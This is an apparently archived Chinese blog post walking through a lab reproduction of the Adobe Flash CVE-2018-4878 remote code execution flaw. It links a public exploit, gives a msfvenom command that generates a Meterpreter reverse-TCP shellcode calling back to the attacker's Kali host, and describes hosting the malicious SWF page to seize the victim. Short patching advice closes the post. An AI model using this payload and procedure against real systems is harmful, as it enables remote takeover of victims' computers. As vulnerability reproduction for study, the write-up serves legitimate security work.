# Adboe Flash 远程代码执行 _CVE-2018-4878 漏洞复现 - 雨中落叶 - 博客园

> 原文：[`www.cnblogs.com/yuzly/p/11104935.html`](https://www.cnblogs.com/yuzly/p/11104935.html)

Adboe Flash 远程代码执行 _CVE-2018-4878 漏洞复现

**一、漏洞描述**

该漏洞可针对 windows 用户发起定向攻击。攻击者可以诱导用户打开包含恶意 Flash 代码文件的 Microsoft Office 文档、网页、垃圾电子邮件等。

**二、漏洞影响版本**

Flash Player 版本 28.0.0.137 以及之前的所有版本

　　![](img/9aafc9c77c296f1c30f6197675a34d59.png)

**三、漏洞复现环境搭建**

攻击机:kali   ip:192.168.10.136

靶机:win10   ie 默认集成 flash,没有升级

**四、漏洞复现**

1.github 下载 exp, [`github.com/anbai-inc/CVE-2018-4878`](https://github.com/anbai-inc/CVE-2018-4878)

2.修改 exp

2.1 修改 shellcode 为自己生成的反弹连接 shellcode,首先先生成反弹连接 shellcode

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.136 lport=8888 -f python >/root/shellcode.txt

　　![](img/62ff98b139f53d5378452a0600186816.png)

2.2 用生成的 shellcode 替换 exp 中对应的 shellcode

　　![](img/6aab32bb3b6551280557e41cd3d7f6cb.png)

2.3 修改 exp 中生成文件保存的路径

　　![](img/865ae877281200446c2bc3684abb791b.png)

3.运行 python 脚本,会生成两个文件, exploit.swf 和 index.html

4.把 exploit.swf 和 index.html 复制到/var/www/html,然后开启 web 服务, 此时，Kali Linux 上 Web 服务启动，并且具备 index.html 这个页面。只要靶机启用 flash 并访问了这个页面，则可以直接被控制

5.kali 开启监听

　　![](img/8bc840424db02a38ef8df8db07d33ac7.png)

6.靶机访问 http://192.168.10.136/index.html

　　![](img/084ebf5410261126559a983cd9472f46.png)

7.此时 kali 端已经获取到会话

　　![](img/3a279cfc4031720a526424fa9d4ff4c8.png)

**五、漏洞防御**

1.下载最新版本的 Adobe Flash

2.安装常见杀毒软件,开启实时防护和杀毒引擎实时升级